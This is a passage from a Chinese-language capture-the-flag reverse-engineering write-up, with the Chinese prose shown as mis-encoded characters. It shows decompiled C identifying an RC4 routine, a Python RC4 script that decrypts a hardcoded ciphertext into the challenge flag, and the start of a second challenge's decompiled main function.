</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Great!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v10</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§‚å¯Ÿç¨‹åºå¯çŸ¥ï¼Œæœ‰ä¸€æ­¥å°†sub_44656å‹æ ˆè§‚å¯Ÿè¿™ä¸ªå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_44656</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-21Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-21Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-218h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-214h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-214h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v13</span><span class="p">[</span><span class="mi">520</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-210h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+238h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v14</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">%</span> <span class="n">a4</span> <span class="o">+</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v13</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">256</span><span class="p">]</span> <span class="o">+</span> <span class="n">v8</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v13</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">v8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v8</span><span class="p">]</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">a2</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="p">(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="n">v9</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">v9</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v9</span><span class="p">]</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">k</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">^=</span> <span class="n">v13</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">+</span> <span class="n">v13</span><span class="p">[</span><span class="n">v9</span><span class="p">])];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v14</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯çŸ¥å’Œæ˜¯ä¸€ä¸ªæ ‡å‡†rc4</p>
<p>æ‰€ä»¥æå–å¯†æ–‡å¹¶å†™å‡ºè§£å¯†è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># RC4 åŠ å¯†å’Œè§£å¯†å‡½æ•°</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆå§‹åŒ– S ç›’</span>
</span></span><span class="line"><span class="cl">    <span class="n">S</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆå§‹åŒ– KSAï¼ˆå¯†é’¥è°ƒåº¦ç®—æ³•ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># PRGAï¼ˆä¼ªéšæœºç”Ÿæˆç®—æ³•ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¯†é’¥</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;geek2025&#34;</span>  <span class="c1"># ä¸ç¨‹åºä¸­çš„å¯†é’¥ä¸€è‡´</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‡è®¾ä½ çŸ¥é“åŠ å¯†åçš„ 28 å­—ç¬¦çš„å¯†æ–‡</span>
</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x0F3</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x0E6</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x0E5</span><span class="p">,</span> <span class="mh">0x0F0</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                     <span class="mh">0x0E5</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span><span class="mh">0x9F</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x0C9</span><span class="p">,</span> <span class="mh">0x0A6</span><span class="p">,</span> <span class="mh">0x0BB</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,])</span>  <span class="c1"># å‡è®¾å¯†æ–‡ï¼Œéœ€ç”¨å®é™…å¯†æ–‡æ›¿æ¢</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è§£å¯†</span>
</span></span><span class="line"><span class="cl"><span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">rc4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£å¯†åçš„æ•°æ®ï¼š&#34;</span><span class="p">,</span> <span class="n">decrypted_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœï¼šè§£å¯†åçš„æ•°æ®ï¼š SYC{50_y0u_pl@y_Gensh1n_too}</p>
<h3 id="8mission-ghostsignal">8.Mission GhostSignal
</h3><p>è¿™æ˜¯ä¸€ä¸ªmiscå’Œreèåˆçš„é¢˜ç›®ï¼Œç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸€ä¸ªexeæ–‡ä»¶ï¼Œå¤§æ¦‚ç‡æ˜¯é€šexeæ–‡ä»¶æ‰¾åˆ°å¯†ç ï¼Œåœ¨è§£å‹ç¼©</p>
<p>å…ˆçœ‹mainå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_BYTE</span> <span class="n">v4</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [esp+1Ch] [ebp-20Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">[</span><span class="mi">192</span><span class="p">];</span> <span class="c1">// [esp+3Ch] [ebp-1ECh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [esp+FCh] [ebp-12Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v7</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [esp+1FCh] [ebp-2Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+20Ch] [ebp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [esp+210h] [ebp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [esp+217h] [ebp-11h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+218h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [esp+21Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_403500</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">SetConsoleOutputCP</span><span class="p">(</span><span class="mh">0xFDE9u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">SetConsoleCP</span><span class="p">(</span><span class="mh">0xFDE9u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="s">&#34;1145141145144332&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v7</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_407090</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">fgets</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">iob</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">_ptr</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&amp;&amp;</span> <span class="n">input</span><span class="p">[</span><span class="n">v12</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">input</span><span class="p">[</span><span class="o">--</span><span class="n">v12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                        
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">==</span> <span class="mi">25</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_401C08</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">aSyclover2025ge</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>      
</span></span><span class="line"><span class="cl">      <span class="nf">memcpy</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mh">0x19u</span><span class="p">);</span>                
</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">25</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">31</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>       
</span></span><span class="line"><span class="cl">        <span class="n">v4</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_402B57</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">31</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">byte_406020</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">v4</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4070F0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_40711C</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4070BC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4070AB</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
